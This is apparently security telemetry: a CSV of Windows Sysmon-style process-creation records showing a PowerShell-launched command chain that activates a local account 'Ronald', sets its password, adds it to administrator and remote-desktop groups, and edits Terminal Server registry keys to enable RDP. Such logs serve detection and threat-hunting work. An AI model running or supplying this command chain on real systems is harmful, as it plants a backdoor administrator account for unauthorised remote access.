process,winlog,@timestamp,file
{'name': 'WmiPrvSE.exe'},{'task': 'Image loaded (rule: ImageLoad)'},2025-03-26T17:12:23.028Z,{'path': 'C:\\Windows\\System32\\wbem\\wmiutils.dll'}
"{'parent': {'name': 'command.exe', 'command_line': '""command.exe"" /c net user Ronald /active:yes & net user Ronald Password!@#2025 & net localgroup Admins Ronald /add & net localgroup ""RDP_Users"" Ronald /add & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v disableTS /t REG_DWORD /d 0 /f & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v ""enableTS"" /t REG_DWORD /d 0x1 /f'}, 'name': 'network_tool.exe', 'command_line': 'net  user Ronald Password!@#2025 '}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.392Z,
"{'parent': {'name': 'network_tool.exe', 'command_line': 'net  user Ronald /active:yes '}, 'name': 'net1.exe', 'command_line': 'C:\\Windows\\system32\\net1  user Ronald /active:yes '}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.313Z,
"{'parent': {'name': 'command.exe', 'command_line': '""command.exe"" /c net user Ronald /active:yes & net user Ronald Password!@#2025 & net localgroup Admins Ronald /add & net localgroup ""RDP_Users"" Ronald /add & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v disableTS /t REG_DWORD /d 0 /f & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v ""enableTS"" /t REG_DWORD /d 0x1 /f'}, 'name': 'network_tool.exe', 'command_line': 'net  user Ronald /active:yes '}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.290Z,
"{'parent': {'name': 'command.exe', 'command_line': '""command.exe"" /c net user Ronald /active:yes & net user Ronald Password!@#2025 & net localgroup Admins Ronald /add & net localgroup ""RDP_Users"" Ronald /add & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v disableTS /t REG_DWORD /d 0 /f & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v ""enableTS"" /t REG_DWORD /d 0x1 /f'}, 'name': 'reg.exe', 'command_line': 'reg  add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v ""enableTS"" /t REG_DWORD /d 0x1 /f'}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.724Z,
"{'parent': {'name': 'network_tool.exe', 'command_line': 'net  user Ronald Password!@#2025 '}, 'name': 'net1.exe', 'command_line': 'C:\\Windows\\system32\\net1  user Ronald Password!@#2025 '}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.454Z,
"{'parent': {'name': 'command.exe', 'command_line': '""command.exe"" /c net user Ronald /active:yes & net user Ronald Password!@#2025 & net localgroup Admins Ronald /add & net localgroup ""RDP_Users"" Ronald /add & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v disableTS /t REG_DWORD /d 0 /f & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v ""enableTS"" /t REG_DWORD /d 0x1 /f'}, 'name': 'network_tool.exe', 'command_line': 'net  localgroup Admins Ronald /add '}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.539Z,
"{'parent': {'name': 'command.exe', 'command_line': '""command.exe"" /c net user Ronald /active:yes & net user Ronald Password!@#2025 & net localgroup Admins Ronald /add & net localgroup ""RDP_Users"" Ronald /add & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v disableTS /t REG_DWORD /d 0 /f & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v ""enableTS"" /t REG_DWORD /d 0x1 /f'}, 'name': 'reg.exe', 'command_line': 'reg  add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v disableTS /t REG_DWORD /d 0 /f '}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.703Z,
"{'parent': {'name': 'ps_script.exe', 'command_line': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\ps_script.exe"" '}, 'name': 'command.exe', 'command_line': '""command.exe"" /c net user Ronald /active:yes & net user Ronald Password!@#2025 & net localgroup Admins Ronald /add & net localgroup ""RDP_Users"" Ronald /add & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v disableTS /t REG_DWORD /d 0 /f & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v ""enableTS"" /t REG_DWORD /d 0x1 /f'}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.190Z,
"{'parent': {'name': 'command.exe', 'command_line': '""command.exe"" /c net user Ronald /active:yes & net user Ronald Password!@#2025 & net localgroup Admins Ronald /add & net localgroup ""RDP_Users"" Ronald /add & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v disableTS /t REG_DWORD /d 0 /f & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v ""enableTS"" /t REG_DWORD /d 0x1 /f'}, 'name': 'network_tool.exe', 'command_line': 'net  localgroup ""RDP_Users"" Ronald /add '}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.623Z,
"{'parent': {'name': 'network_tool.exe', 'command_line': 'net  localgroup ""RDP_Users"" Ronald /add '}, 'name': 'net1.exe', 'command_line': 'C:\\Windows\\system32\\net1  localgroup ""RDP_Users"" Ronald /add '}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.646Z,
